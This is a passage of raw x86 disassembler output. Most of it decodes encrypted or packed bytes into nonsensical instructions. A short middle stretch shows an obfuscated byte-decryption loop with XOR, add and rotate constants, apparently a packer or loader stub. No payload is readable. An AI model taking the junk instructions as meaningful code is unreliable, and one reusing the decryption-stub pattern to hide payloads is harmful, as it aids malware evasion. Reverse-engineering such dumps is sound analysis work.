  4216c7:	fnsave [ecx-0x3a313b2d]
  4216cd:	out    dx,eax
  4216ce:	int3   
  4216cf:	mov    ecx,0xfcb5bef0
  4216d4:	mov    edi,0xe5d9d4be
  4216d9:	(bad)  
  4216db:	fneni(8087 only) 
  4216dd:	jecxz  0x4216d4
  4216df:	add    eax,DWORD PTR [ecx]
  4216e1:	or     eax,0xf7c3eed3
  4216e6:	leave  
  4216e7:	(bad)  
  4216e8:	lock fsub st(0),st
  4216eb:	mov    al,0xe5
  4216ed:	icebp  
  4216ee:	jmp    0x4216db
  4216f0:	(bad)
  4216f3:	hlt    
  4216f4:	out    dx,eax
  4216f5:	loope  0x4216ea
  4216f7:	out    0x2,al
  4216f9:	add    al,0xc3
  4216fb:	rol    BYTE PTR [esi],0xd6
  4216fe:	(bad)  
  421700:	out    dx,al
  421701:	leave  
  421702:	add    eax,0xf7e6c1df
  421707:	lods   al,BYTE PTR ds:[esi]
  421708:	ret    
  421709:	mov    bh,0xc2
  42170b:	mov    ah,0xed
  42170d:	scas   al,BYTE PTR es:[edi]
  42170e:	lods   eax,DWORD PTR ds:[esi]
  42170f:	shl    ebx,1
  421711:	retf   0xfcbe
  421714:	lock fcmovbe st,st(4)
  421717:	std    
  421718:	shl    edx,1
  42171a:	fcomi  st,st(2)
  42171c:	loopne 0x421712
  42171e:	xlat   BYTE PTR ds:[ebx]
  42171f:	or     edi,edx
  421721:	int3   
  421722:	in     eax,dx
  421723:	shl    DWORD PTR [edx-0x193e4157],cl
  421729:	mov    cl,0xf6
  42172b:	aam    0xca
  42172d:	mov    cl,0xd7
  42172f:	cmc    
  421730:	sar    BYTE PTR [eax-0x49290a29],cl
  421736:	mov    ebp,0xe2c6d7d8
  42173b:	imul   edx
  42173d:	les    ecx,FWORD PTR [esi]
  42173f:	cld    
  421740:	add    al,BYTE PTR [ecx+edi*8]
  421743:	in     eax,dx
  421744:	mov    bl,0xf0
  421746:	mov    edi,0xedd5c2bc
  42174b:	repnz shl dh,0xc5
  42174f:	in     al,0xee
  421751:	fdivr  st(4),st
  421753:	fcmovne st,st(0)
  421755:	ret    0x3f0
  421758:	lock fxtract 
  42175b:	fld    QWORD PTR [eax]
  42175d:	or     al,BYTE PTR [edi]
  42175f:	add    ah,dl
  421761:	fld    DWORD PTR [edi]
  421763:	cld    
  421764:	(bad)  
  421765:	iret   
  421766:	retf   0xd3e9
  421769:	(bad)  
  42176a:	loopne 0x421737
  42176c:	enter  0xbfd0,0xec
  421770:	mov    ebx,0xcedbcbd3
  421775:	jecxz  0x421764
  421777:	jecxz  0x42174b
  421779:	loope  0x421734
  42177b:	rcl    bh,1
  42177d:	in     al,0xe0
  42177f:	in     al,0x4
  421781:	std    
  421782:	fiadd  DWORD PTR [ecx]
  421784:	repnz test al,0xcd
  421787:	test   al,0xb2
  421789:	ret    0xe9f0
  42178c:	scas   eax,DWORD PTR es:[edi]
  42178d:	mov    eax,0xd9d4d1d8
  421792:	int    0xcc
  421794:	aam    0xbc
  421796:	(bad)  
  421798:	in     eax,dx
  421799:	xlat   BYTE PTR ds:[ebx]
  42179a:	cmc    
  42179b:	jmp    0xe02bf99a
  4217a0:	or     eax,0xc0d9e3f8
  4217a5:	scas   eax,DWORD PTR es:[edi]
  4217a6:	mov    dl,0xb1
  4217a8:	jmp    0xfbfded6d
  4217ad:	enter  0xffda,0xf7
  4217b1:	(bad)  
  4217b2:	cmc    
  4217b3:	into   
  4217b4:	iret   
  4217b5:	fcmovnu st,st(4)
  4217b7:	shl    dh,0xff
  4217ba:	in     al,0xd4
  4217bc:	dec    DWORD PTR [edi]
  4217be:	idiv   eax
  4217c0:	hlt    
  4217c1:	cli    
  4217c2:	sti    
  4217c3:	(bad)  
  4217c4:	out    0xc4,eax
  4217c6:	mov    bh,0xc4
  4217c8:	in     eax,dx
  4217c9:	out    0xe5,eax
  4217cb:	repnz mov cl,0xae
  4217ce:	aam    0xf6
  4217d0:	(bad)  
  4217d2:	fdivrp st(4),st
  4217d4:	lock out dx,al
  4217d6:	int    0xe7
  4217d8:	fadd   st(4),st
  4217da:	cld    
  4217db:	add    DWORD PTR [esi],eax
  4217dd:	rcr    cl,1
  4217df:	loop   0x4217de
  4217e1:	add    edi,edi
  4217e3:	or     BYTE PTR [ecx-0x132f302d],bh
  4217e9:	aad    0xd5
  4217eb:	fnstenv [eax-0x362a394b]
  4217f1:	mov    dl,0xb4
  4217f3:	(bad)  
  4217f5:	mov    esp,0xc7e2febd
  4217fa:	(bad)
  4217fd:	add    esp,esp
  4217ff:	add    eax,0xdfe9f9e9
  421804:	out    dx,eax
  421805:	scas   al,BYTE PTR es:[edi]
  421806:	mov    al,0xd7
  421808:	mov    ebp,0xb6cdeee6
  42180d:	fidivr DWORD PTR [ecx-0x1c4b244b]
  421813:	add    dl,dh
  421815:	cmc    
  421816:	fld    st(3)
  421818:	stc    
  421819:	lock add ebx,ebp
  42181c:	loop   0x4217fa
  42181e:	add    al,0xc7
  421820:	jmp    0xe9e6:0xefc8e7f4
  421827:	rcl    ebp,cl
  421829:	out    0xc1,eax
  42182b:	jmp    0xd51e0c05
  421830:	into   
  421831:	idiv   BYTE PTR [edx-0x262a232e]
  421837:	rcl    al,cl
  421839:	xlat   BYTE PTR ds:[ebx]
  42183a:	cmc    
  42183b:	retf   0xd5db
  42183e:	(bad)  
  42183f:	loop   0x42184d
  421841:	out    dx,eax
  421842:	stc    
  421843:	or     al,al
  421845:	retf   0xf5a8
  421848:	(bad)  
  421849:	shr    cl,1
  42184b:	shr    ebx,cl
  42184d:	out    0xff,eax
  42184f:	fscale 
  421851:	fsub   st(7),st
  421853:	jmp    0xda02e92a
  421858:	aam    0xb
  42185a:	pop    es
  42185b:	fstp   st(0)
  42185d:	lock mov ebp,0x13fbc806
  421863:	int3   
  421864:	ret    
  421865:	mov    esp,0xc7acbdd6
  42186a:	loopne 0x421857
  42186c:	enter  0xb1b5,0xbb
  421870:	mov    edi,0xfcfdd2bb
  421875:	fst    st(0)
  421877:	clc    
  421878:	stc    
  421879:	in     eax,0xdf
  42187b:	jmp    0x729da44
  421880:	frstpm(287 only) 
  421882:	in     eax,dx
  421883:	retf   
  421884:	les    esi,FWORD PTR [ecx-0x281e3e36]
  42188a:	lock in eax,dx
  42188c:	mov    edx,0xf7d4ccd7
  421891:	out    dx,al
  421892:	lock shr ah,1
  421895:	out    0x0,eax
  421897:	add    ah,ah
  421899:	push   es
  42189a:	fldl2t 
  42189c:	fld    DWORD PTR [esi]
  42189e:	iret   
  42189f:	out    dx,eax
  4218a0:	fadd   st,st(4)
  4218a2:	push   cs
  4218a3:	out    0xf0,al
  4218a5:	loop   0x42187d
  4218a7:	fsubp  st(3),st
  4218a9:	mov    ah,0xee
  4218ab:	icebp  
  4218ac:	enter  0xe4f9,0xea
  4218b0:	mov    bh,0xbd
  4218b2:	xlat   BYTE PTR ds:[ebx]
  4218b3:	mov    esi,0xf2d2bcbf
  4218b8:	add    eax,0xd4fdc6f7
  4218bd:	retf   0x908
  4218c0:	or     ebx,edx
  4218c2:	add    al,0xe6
  4218c4:	out    0xdf,eax
  4218c6:	loope  0x421893
  4218c8:	shl    DWORD PTR [eax-0x714130a],0xd0
  4218cf:	out    0xcc,al
  4218d1:	iret   
  4218d2:	mov    edi,0xf4d6b9de
  4218d7:	into   
  4218d8:	icebp  
  4218d9:	add    al,0x2
  4218db:	icebp  
  4218dc:	lock jmp 0xdfc9:0x9e8bc01
  4218e4:	mov    cl,0xc4
  4218e6:	mov    bh,0xce
  4218e8:	aad    0xc8
  4218ea:	iret   
  4218eb:	int3   
  4218ec:	fcmove st,st(1)
  4218ee:	mov    ecx,0xffd9eac5
  4218f3:	in     al,dx
  4218f4:	fld    QWORD PTR [edx]
  4218f6:	mov    esp,0xc6db04d3
  4218fb:	mov    esp,0xfec0f40b
  421900:	push   cs
  421901:	or     eax,0xefe906e9
  421906:	int3   
  421907:	out    dx,eax
  421908:	mov    cl,0xc7
  42190a:	sti    
  42190b:	test   al,0xef
  42190d:	int    0xc9
  42190f:	mov    ch,0xd8
  421911:	hlt    
  421912:	(bad)  
  421914:	ret    0xd7c2
  421917:	sti    
  421918:	(bad)  
  421919:	mov    edx,0xd8070202
  42191e:	out    dx,al
  42191f:	inc    DWORD PTR [eax+edi*8]
  421922:	int3   
  421923:	fsubrp st(0),st
  421925:	(bad)  
  421927:	lock lods al,BYTE PTR ds:[esi]
  421929:	int3   
  42192a:	xlat   BYTE PTR ds:[ebx]
  42192b:	out    dx,eax
  42192c:	ror    eax,0xb4
  42192f:	(bad)  
  421930:	out    dx,eax
  421931:	int3   
  421932:	add    bh,ah
  421934:	in     al,dx
  421935:	enter  0xccfd,0xd7
  421939:	mov    ah,0xc4
  42193c:	ret    
  42193d:	retf   
  42193e:	add    eax,esp
  421940:	add    eax,0xeacc0dc4
  421945:	int3   
  421946:	shl    BYTE PTR [ebx-0x1711182c],0xb6
  42194d:	mov    dh,0xcd
  42194f:	retf   
  421950:	hlt    
  421951:	fmul   st,st(7)
  421953:	(bad)  
  421955:	mov    esp,0xf7fef2d5
  42195a:	push   es
  42195b:	mul    esi
  42195d:	add    bh,dh
  42195f:	hlt    
  421960:	aam    0x5
  421962:	cld    
  421963:	rcl    cl,cl
  421965:	mov    cl,0xbc
  421967:	jmp    0x42193a
  421969:	ret    
  42196a:	rol    cl,0xc9
  42196d:	leave  
  42196e:	int3   
  42196f:	icebp  
  421970:	jmp    0x421965
  421972:	call   0xbf33f151
  421977:	in     eax,dx
  421978:	repnz in al,dx
  42197a:	repz out 0xde,eax
  42197d:	fadd   DWORD PTR [ebx]
  42197f:	sti    
  421980:	retf   0xedeb
  421983:	fmul   st,st(6)
  421985:	out    0xd2,eax
  421987:	fmulp  st(6),st
  421989:	repz (bad) 
  42198b:	iret   
  42198c:	(bad)  
  42198d:	aad    0xca
  42198f:	in     eax,0xbf
  421991:	in     al,0xbc
  421993:	int3   
  421994:	iret   
  421995:	idiv   DWORD PTR [eax+edx*8-0x1b253c07]
  42199c:	neg    ah
  42199e:	fucomi st,st(5)
  4219a0:	jecxz  0x4219a8
  4219a2:	or     ebx,ecx
  4219a4:	in     eax,dx
  4219a5:	out    dx,eax
  4219a6:	loopne 0x421959
  4219a8:	iret   
  4219a9:	(bad)  
  4219aa:	not    ebx
  4219ac:	les    esi,FWORD PTR [edi-0x1c2f0d13]
  4219b2:	not    bl
  4219b4:	add    edi,ebx
  4219b6:	pop    es
  4219b7:	fdivp  st(0),st
  4219b9:	in     al,0x6
  4219bb:	fyl2x  
  4219bd:	loopne 0x4219c1
  4219bf:	cld    
  4219c0:	hlt    
  4219c1:	adc    esp,ebx
  4219c3:	jecxz  0x421987
  4219c5:	mov    cl,0xc6
  4219c7:	out    0xd0,al
  4219c9:	(bad)  
  4219ca:	cli    
  4219cb:	in     eax,dx
  4219cc:	retf   0xf3cc
  4219cf:	jmp    0xfb0ad0c4
  4219d4:	sar    DWORD PTR [esi-0x22fc0125],0xf8
  4219db:	push   es
  4219dc:	std    
  4219dd:	aam    0xe2
  4219df:	cmc    
  4219e0:	or     ah,ah
  4219e2:	cli    
  4219e3:	or     ebp,ecx
  4219e5:	ret    
  4219e6:	loop   0x4219ac
  4219e8:	shr    ch,1
  4219ea:	enter  0xe7ba,0xc7
  4219ee:	(bad)  
  4219ef:	std    
  4219f0:	mov    dh,0xc9
  4219f2:	cmc    
  4219f3:	mov    edi,0xbee202fc
  4219f8:	test   BYTE PTR ds:0xfec5d9df,0xcb
  4219ff:	out    0xdc,eax
  421a01:	loope  0x4219ed
  421a03:	repz shl esi,0xc4
  421a07:	out    0xad,al
  421a09:	in     eax,dx
  421a0a:	cmc    
  421a0b:	int    0xe9
  421a0d:	fxch   st(2)
  421a0f:	clc    
  421a10:	repz jmp 0xd9fd12d1
  421a16:	mov    ebp,0xebe6fa
  421a1b:	ror    BYTE PTR [edx],cl
  421a1d:	push   es
  421a1e:	cld    
  421a1f:	fstp   st(7)
  421a21:	jecxz  0x421a1c
  421a23:	fmulp  st(2),st
  421a25:	in     al,0xd3
  421a27:	in     eax,0xc7
  421a29:	int    0xe9
  421a2b:	loopne 0x4219e0
  421a2d:	loopne 0x4219fa
  421a2f:	mov    eax,0xf0efdab8
  421a34:	mov    ecx,0xd1edb9d8
  421a39:	shr    bl,0xd4
  421a3c:	out    0xff,eax
  421a3e:	add    ebp,ebp
  421a40:	(bad)  
  421a42:	or     al,BYTE PTR [ecx+edx*8]
  421a45:	rol    dl,cl
  421a47:	repnz (bad) 
  421a49:	ror    ebp,1
  421a4b:	mov    dl,0xe4
  421a4d:	mov    ch,0xec
  421a4f:	(bad)  
  421a50:	(bad)  
  421a51:	int3   
  421a52:	imul   dl
  421a54:	rcr    eax,cl
  421a56:	loopne 0x421a10
  421a58:	rol    dh,0xf6
  421a5b:	retf   0x2de
  421a5e:	fucomp st(3)
  421a60:	fsubrp st(7),st
  421a62:	out    dx,eax
  421a63:	add    eax,0xd3e2c8bc
  421a68:	iret   
  421a69:	(bad)  
  421a6a:	into   
  421a6b:	call   0xd827106b
  421a70:	rcl    esp,1
  421a72:	cli    
  421a73:	neg    esp
  421a75:	add    DWORD PTR [edi+0x6e707bc],edi
  421a7b:	(bad)  
  421a7c:	add    ch,al
  421a7e:	out    0xf4,eax
  421a80:	in     eax,dx
  421a81:	jmp    0xe7e3:0xeedf06ff
  421a88:	ret    0xb2d1
  421a8b:	int    0xca
  421a8d:	stc    
  421a8e:	jmp    0xf6f5:0xeee9bfc5
  421a95:	lock mov eax,0xc2e1fbd2
  421a9b:	cli    
  421a9c:	sti    
  421a9d:	add    ah,cl
  421a9f:	iret   
  421aa0:	ret    
  421aa1:	fdivr  st(2),st
  421aa3:	fnstsw WORD PTR [esi-0x4d363d53]
  421aa9:	shr    edx,cl
  421aab:	aad    0xf4
  421aad:	out    dx,al
  421aae:	leave  
  421aaf:	stc    
  421ab0:	clc    
  421ab1:	in     al,dx
  421ab2:	fdecstp 
  421ab4:	jmp    0x31d096f
  421ab9:	ret    
  421aba:	out    0xb,eax
  421abc:	retf   0xd5c4
  421abf:	add    ebx,esp
  421ac1:	adc    ecx,ebp
  421ac3:	enter  0xe5e4,0xce
  421ac7:	lods   al,BYTE PTR ds:[esi]
  421ac8:	mov    ebp,0xb1b3d7ae
  421acd:	int3   
  421ace:	out    0xe8,al
  421ad0:	iret   
  421ad1:	rcr    ebx,cl
  421ad3:	cmc    
  421ad4:	hlt    
  421ad5:	fmul   st(5),st
  421ad7:	aam    0xe1
  421ad9:	loopne 0x421aab
  421adb:	fld    DWORD PTR [esi]
  421add:	lock fmul st,st(0)
  421ae0:	push   cs
  421ae1:	ret    0xede6
  421ae4:	call   0xd63500c5
  421ae9:	loop   0x421ac2
  421aeb:	leave  
  421aec:	in     eax,dx
  421aed:	(bad)  
  421aef:	std    
  421af0:	out    dx,eax
  421af1:	icebp  
  421af2:	fucomp st(1)
  421af4:	cld    
  421af5:	stc    
  421af6:	out    0xda,eax
  421af8:	int3   
  421af9:	shl    ah,0xd6
  421afc:	clc    
  421afd:	add    eax,ecx
  421aff:	jmp    0x421adb
  421b01:	out    dx,al
  421b02:	add    eax,0xf3e2b2c9
  421b07:	mov    bh,0xf1
  421b09:	int3   
  421b0a:	loopne 0x421abe
  421b0c:	shl    bh,0xf8
  421b0f:	(bad)  
  421b11:	out    dx,al
  421b12:	aad    0xf9
  421b14:	loop   0x421ae2
  421b16:	pop    es
  421b17:	fcmovbe st,st(7)
  421b19:	add    esi,ebx
  421b1b:	add    bh,ah
  421b1d:	out    0xe,eax
  421b1f:	ror    dl,0xe4
  421b22:	push   es
  421b23:	stc    
  421b24:	(bad)  
  421b26:	mov    ebp,0xc4b1d6e3
  421b2b:	mov    edx,0xedebd1ea
  421b30:	(bad)  
  421b31:	cld    
  421b32:	fadd   QWORD PTR [edx]
  421b34:	mov    ecx,0xd6e7fb00
  421b39:	icebp  
  421b3a:	loop   0x421b11
  421b3c:	sti    
  421b3d:	fimul  WORD PTR [ecx]
  421b3f:	(bad)  
  421b40:	fist   WORD PTR [ebx]
  421b42:	fld    DWORD PTR ds:0xf6c5e6e2
  421b48:	mov    cl,0xb2
  421b4a:	test   eax,0xf5f3f6c2
  421b4f:	(bad)  
  421b51:	int    0xe3
  421b53:	aad    0xd3
  421b55:	rol    edi,1
  421b57:	(bad)  
  421b58:	int3   
  421b59:	fcos   
  421b5b:	test   BYTE PTR [eax],0xe7
  421b5e:	(bad)  
  421b5f:	aam    0xa
  421b61:	adc    edx,DWORD PTR [edx]
  421b63:	in     al,0xc0
  421b65:	iret   
  421b66:	test   ebp,0xe7a9d0e8
  421b6c:	out    0xc0,eax
  421b6e:	out    dx,al
  421b6f:	fucomip st,st(2)
  421b71:	into   
  421b72:	jmp    0x6b8:0xdabab9bf
  421b79:	mov    esi,0xdaf7d7ff
  421b7e:	add    BYTE PTR [ecx],al
  421b80:	(bad)  
  421b82:	call   0xccf10663
  421b87:	retf   0xe6c0
  421b8a:	out    0xf2,eax
  421b8c:	fcmovu st,st(7)
  421b8e:	(bad)  
  421b8f:	jmp    0x421b7a
  421b91:	in     eax,dx
  421b92:	mov    ch,0xbf
  421b94:	dec    dh
  421b96:	fchs   
  421b98:	(bad)  
  421b9a:	(bad)  
  421b9b:	add    edi,esi
  421b9d:	loop   0x421b5c
  421b9f:	std    
  421ba0:	in     eax,0x1
  421ba2:	int    0xea
  421ba4:	loope  0x421b4c
  421ba6:	iret   
  421ba7:	(bad)  
  421ba8:	mov    esp,0xcaede8aa
  421bad:	enter  0xffdf,0xce
  421bb1:	mov    edi,0xd400d0e9
  421bb6:	iret   
  421bb7:	in     eax,0xdf
  421bb9:	loopne 0x421bab
  421bbb:	repnz mov edi,0xe20fee00
  421bc1:	push   cs
  421bc2:	in     eax,dx
  421bc3:	icebp  
  421bc4:	lock int 0xe4
  421bc7:	lds    edi,FWORD PTR [ebp+eiz*8-0x1377a75]
  421bce:	(bad)  
  421bcf:	dec    DWORD PTR [ebx-0x12f7a7c]
  421bd5:	(bad)  
  421bd6:	inc    DWORD PTR ds:0x405fcdc
  421bdc:	mov    ecx,DWORD PTR [ebp-0x138]
  421be2:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421be9:	jmp    0x421c0d
  421bee:	mov    eax,DWORD PTR [ebp-0x138]
  421bf4:	mov    eax,DWORD PTR [ebp+eax*4-0x130]
  421bfb:	sub    eax,0x250bcdc
  421c00:	mov    ecx,DWORD PTR [ebp-0x138]
  421c06:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  421c0d:	jmp    0x41d41c
  421c12:	cmp    DWORD PTR [ebp-0x140],0x0
  421c19:	jne    0x421c39
  421c1f:	movzx  eax,BYTE PTR [ebp-0x131]
  421c26:	xor    eax,0x83
  421c2b:	add    eax,0x8
  421c2e:	mov    BYTE PTR [ebp-0x131],al
  421c34:	jmp    0x421c78
  421c39:	mov    eax,DWORD PTR [ebp-0x110]
  421c3f:	xor    eax,0x75108b5
  421c44:	add    eax,0x3272fb
  421c49:	movzx  ecx,BYTE PTR [ebp-0x131]
  421c50:	sub    ecx,eax
  421c52:	mov    BYTE PTR [ebp-0x131],cl
  421c58:	mov    ecx,DWORD PTR [ebp-0x108]
  421c5e:	xor    ecx,0x75108b5
  421c64:	add    ecx,0x3272fb
  421c6a:	mov    al,BYTE PTR [ebp-0x131]
  421c70:	ror    al,cl
  421c72:	mov    BYTE PTR [ebp-0x131],al
  421c78:	xor    eax,eax
  421c7a:	mov    eax,DWORD PTR [ebp-0x8]
  421c7d:	add    eax,DWORD PTR [ebp-0x10c]
  421c83:	mov    cl,BYTE PTR [ebp-0x131]
  421c89:	mov    BYTE PTR [eax],cl
  421c8b:	mov    eax,DWORD PTR [ebp-0x10c]
  421c91:	sub    eax,0x3272fb
  421c96:	xor    eax,0x75108b5
  421c9b:	cmp    eax,DWORD PTR [ebp-0x118]
  421ca1:	jne    0x421cfe
  421ca7:	mov    eax,DWORD PTR [ebp-0x104]
  421cad:	xor    eax,0x75108b5
  421cb2:	add    eax,0x3272fb
  421cb7:	mov    ecx,DWORD PTR [ebp-0x11c]
  421cbd:	xor    ecx,0x75108b5
  421cc3:	add    ecx,0x3272fb
  421cc9:	sub    eax,ecx
  421ccb:	sub    eax,0x3272fb
  421cd0:	xor    eax,0x75108b5
  421cd5:	mov    DWORD PTR [ebp-0x104],eax
  421cdb:	mov    eax,DWORD PTR [ebp-0x11c]
  421ce1:	xor    eax,0x75108b5
  421ce6:	add    eax,0x3272fb
  421ceb:	mov    ecx,DWORD PTR [ebp-0x13c]
  421cf1:	sub    ecx,eax
  421cf3:	mov    DWORD PTR [ebp-0x10c],ecx
  421cf9:	jmp    0x421d1c
  421cfe:	mov    eax,DWORD PTR [ebp-0x11c]
  421d04:	xor    eax,0x75108b5
  421d09:	add    eax,0x3272fb
  421d0e:	mov    ecx,DWORD PTR [ebp-0x10c]
  421d14:	sub    ecx,eax
  421d16:	mov    DWORD PTR [ebp-0x10c],ecx
  421d1c:	jmp    0x41afe6
  421d21:	mov    eax,DWORD PTR [ebp+0x8]
  421d24:	jmp    0x4240ca
  421d29:	mov    eax,ds:0x66e06a5
  421d2e:	ins    BYTE PTR es:[edi],dx
  421d2f:	icebp  
  421d30:	je     0x421cd7
  421d32:	pop    ebx
  421d33:	rol    BYTE PTR gs:[edi],cl
  421d36:	enter  0x528b,0x5d
  421d3a:	inc    eax
  421d3b:	jp     0x421db8
  421d3d:	add    bl,BYTE PTR [eax-0x16538485]
  421d43:	shr    edx,cl
  421d45:	enter  0xebc9,0xe4
  421d49:	mov    ebp,0xbdedbffc
  421d4e:	sar    esp,cl
  421d50:	ror    DWORD PTR [edx],0xdf
  421d53:	retf   
  421d54:	loope  0x421d50
  421d56:	cli    
  421d57:	in     eax,dx
  421d58:	or     bl,ah
  421d5a:	out    dx,eax
  421d5b:	repz fsub st,st(7)
  421d5e:	fst    st(6)
  421d60:	loopne 0x421d16
  421d62:	call   0xd1f70c52
  421d67:	aad    0xda
  421d69:	retf   0xfbcf
  421d6c:	into   
  421d6d:	fmul   st,st(5)
  421d6f:	mov    ebx,0xc0c2f306
  421d74:	in     eax,0xe3
  421d76:	into   
  421d77:	(bad)  
  421d78:	loop   0x421d44
  421d7a:	jmp    0xd826e272
  421d7f:	out    0xb7,eax
  421d81:	fcmove st,st(4)
  421d83:	not    dh
  421d85:	retf   0xc9d2
  421d88:	(bad)  
  421d89:	fcmovbe st,st(6)
  421d8b:	shl    dl,cl
  421d8d:	cmc    
  421d8e:	int    0xe0
  421d90:	cli    
  421d91:	aam    0xcb
  421d93:	faddp  st(4),st
  421d95:	hlt    
  421d96:	in     eax,0xdc
  421d98:	out    dx,al
  421d99:	loopne 0x421d8e
  421d9b:	mov    esi,0xdde6b1f7
  421da0:	hlt    
  421da1:	jecxz  0x421d72
  421da3:	mov    ah,0xcb
  421da5:	jmp    0xd2f81c97
  421daa:	out    dx,eax
  421dab:	into   
  421dac:	fcmovnb st,st(0)
  421dae:	icebp  
  421daf:	loopne 0x421d81
  421db1:	(bad)  
  421db2:	shl    edi,1
  421db4:	push   es
  421db5:	or     bl,cl
  421db7:	fist   WORD PTR [ebx]
  421db9:	loop   0x421dcc
  421dbb:	in     eax,0xb2
  421dbd:	(bad)  
  421dbe:	lock shl DWORD PTR [eax-0x33280845],0xf2
  421dc6:	in     al,dx
  421dc7:	hlt    
  421dc8:	(bad)  
  421dc9:	call   0xe214f390
  421dce:	fcmovb st,st(6)
  421dd0:	repnz (bad) 
  421dd2:	rol    DWORD PTR [eax],0xf8
  421dd5:	loopne 0x421dd4
  421dd7:	leave  
  421dd8:	adc    ecx,ebp
  421dda:	fcmove st,st(4)
  421ddc:	into   
  421ddd:	out    0xf3,al
  421ddf:	int3   
  421de0:	mov    esp,0xc0d0f0c1
  421de5:	(bad)  
  421de7:	(bad)
  421dea:	out    dx,eax
  421deb:	mov    edx,0xd7cde1d6
  421df0:	in     eax,0xe3
  421df2:	out    0xdc,eax
  421df4:	loope  0x421dfc
  421df6:	cmc    
  421df7:	pop    es
  421df8:	stc    
  421df9:	stc    
  421dfa:	out    dx,eax
  421dfb:	lods   al,BYTE PTR ds:[esi]
  421dfc:	repnz mov dl,0xdc
  421dff:	call   0xf715ffe7
  421e04:	cmc    
  421e05:	clc    
  421e06:	leave  
  421e07:	fdiv   st(7),st
  421e09:	fidivr WORD PTR [ebx-0x3f0b022b]
  421e0f:	out    0x2,eax
  421e11:	in     eax,0xf8
  421e13:	icebp  
  421e14:	out    0xd7,eax
  421e16:	out    dx,al
  421e17:	stc    
  421e18:	clc    
  421e19:	std    
  421e1a:	adc    ebp,DWORD PTR [esi-0x43190e12]
  421e20:	jecxz  0x421dcf
  421e22:	loop   0x421deb
  421e24:	retf   
  421e25:	retf   
  421e26:	(bad)  
  421e28:	iret   
  421e29:	sti    
  421e2a:	loope  0x421df5
  421e2c:	iret   
  421e2d:	rol    ebx,cl
  421e2f:	in     eax,0xdd
  421e31:	cld    
  421e32:	xlat   BYTE PTR ds:[ebx]
  421e33:	mov    edi,0xd5fddbdc
  421e38:	loop   0x421e38
  421e3a:	fldl2e 
  421e3c:	ret    
  421e3d:	(bad)  
  421e3f:	retf   0xdbaa
  421e42:	(bad)
  421e45:	mov    edi,0xfecedcd5
  421e4a:	sar    eax,cl
  421e4c:	lock into 
  421e4e:	cmc    
  421e4f:	cmc    
  421e50:	push   es
  421e51:	std    
  421e52:	sti    
  421e53:	(bad)  
  421e54:	fcmovnb st,st(4)
  421e56:	iret   
  421e57:	(bad)  
  421e59:	loopne 0x421e3a
  421e5b:	into   
  421e5c:	sar    DWORD PTR [esi+edx*8-0x284f231f],0xd5
  421e64:	into   
  421e65:	shl    bl,cl
  421e67:	shl    al,1
  421e69:	call   0xf620005b
  421e6e:	mov    ah,0xe3
  421e70:	std    
  421e71:	add    al,0xf4
  421e73:	hlt    
  421e74:	jmp    0x702:0xdfdefddd
  421e7b:	out    0xe7,eax
  421e7d:	out    dx,al
  421e7e:	out    0xb5,eax
  421e80:	repz jmp 0x421e55
  421e83:	fld    TBYTE PTR [esi-0x45342830]
  421e89:	mov    cl,0xd8
  421e8b:	mov    ecx,0x5f601ce
  421e90:	out    0xc1,eax
  421e92:	shr    ecx,0x0
  421e95:	cld    
  421e96:	fmulp  st(5),st
  421e98:	add    cl,bh
  421e9a:	into   
  421e9b:	(bad)  
  421e9c:	lock int 0xe6
  421e9f:	shl    BYTE PTR [ebp-0x29320f57],1
  421ea5:	enter  0xbfb7,0xec
  421ea9:	jecxz  0x421ea6
  421eab:	in     eax,dx
  421eac:	shl    ebp,1
  421eae:	repz xlat BYTE PTR ds:[ebx]
  421eb0:	mov    ebp,0xdeffc6cb
  421eb5:	jmp    0x421ec0
  421eb7:	jmp    0xcea9:0xb90401fc
  421ebe:	aad    0xb3
  421ec0:	neg    dl
  421ec2:	iret   
  421ec3:	mov    edx,0xfaf1d2fa
  421ec8:	in     al,dx
  421ec9:	aam    0xfe
  421ecb:	mov    esp,0xc1f7f4cd
  421ed0:	cmc    
  421ed1:	(bad)  
  421ed3:	icebp  
  421ed4:	add    al,0xe0
  421ed6:	out    dx,eax
  421ed7:	jmp    0xac302bc3
  421edc:	out    0xcd,al
  421ede:	lods   al,BYTE PTR ds:[esi]
  421edf:	enter  0xb6b7,0xd9
  421ee3:	iret   
  421ee4:	out    dx,eax
  421ee5:	mov    ch,0xb5
  421ee7:	fld    DWORD PTR [ebx]
  421ee9:	fdivr  st,st(7)
  421eeb:	shr    edi,1
  421eed:	int    0xd7
  421eef:	sar    ah,1
  421ef1:	(bad)  
  421ef2:	hlt    
  421ef3:	jmp    0x421efb
  421ef5:	pop    es
  421ef6:	add    DWORD PTR [edi+eax*1],ecx
  421ef9:	jmp    0x421eca
  421efb:	fdiv   st,st(1)
  421efd:	into   
  421efe:	out    0xc0,eax
  421f00:	ret    
  421f01:	mov    ch,0xac
  421f03:	fsub   st,st(6)
  421f05:	ror    esi,1
  421f07:	(bad)  
  421f09:	mov    esi,0xc2baf701
  421f0e:	add    eax,0xe7fe01d6
  421f13:	ret    
  421f14:	jecxz  0x421ee0
  421f16:	out    dx,eax
  421f17:	jmp    0x421efe
  421f19:	or     al,ah
  421f1b:	retf   
  421f1c:	call   0xad19dde6
  421f21:	lock loope 0x421ef0
  421f24:	sti    
  421f25:	out    dx,eax
  421f26:	out    dx,eax
  421f27:	xlat   BYTE PTR ds:[ebx]
  421f28:	in     eax,dx
  421f29:	div    DWORD PTR [eax-0x2c241d23]
  421f2f:	mov    ebp,0xe5dac4f8
  421f34:	(bad)  
  421f35:	(bad)  
  421f37:	call   0xc951ee10
  421f3c:	retf   
  421f3d:	icebp  
  421f3e:	loopne 0x421f0e
  421f40:	icebp  
  421f41:	loopne 0x421f14
  421f43:	jmp    0xcb27f710
  421f48:	repnz add bh,BYTE PTR [ebx+0x7c0e8f8]
  421f4f:	loopne 0x421f4a
  421f51:	loop   0x421f13
  421f53:	lds    eax,FWORD PTR [edi]
  421f55:	add    eax,0xb01eb02
  421f5a:	call   0xf00ee91f
  421f5f:	not    cl
  421f61:	call   0xd7f3eb35
  421f66:	fstp   st(7)
  421f68:	(bad)  
  421f6a:	in     eax,dx
  421f6b:	aad    0xfb
  421f6d:	in     eax,dx
  421f6e:	aad    0xda
  421f70:	mul    edx
  421f72:	fdivp  st(6),st
  421f74:	div    dh
  421f76:	jmp    0xcfd3:0xa09edcf
  421f7d:	call   0xc6160b44
  421f82:	cli    
  421f83:	repnz loopne 0x421f56
  421f86:	jmp    0xd13a104a
  421f8b:	out    dx,eax
  421f8c:	(bad)  
  421f8e:	jecxz  0x421f52
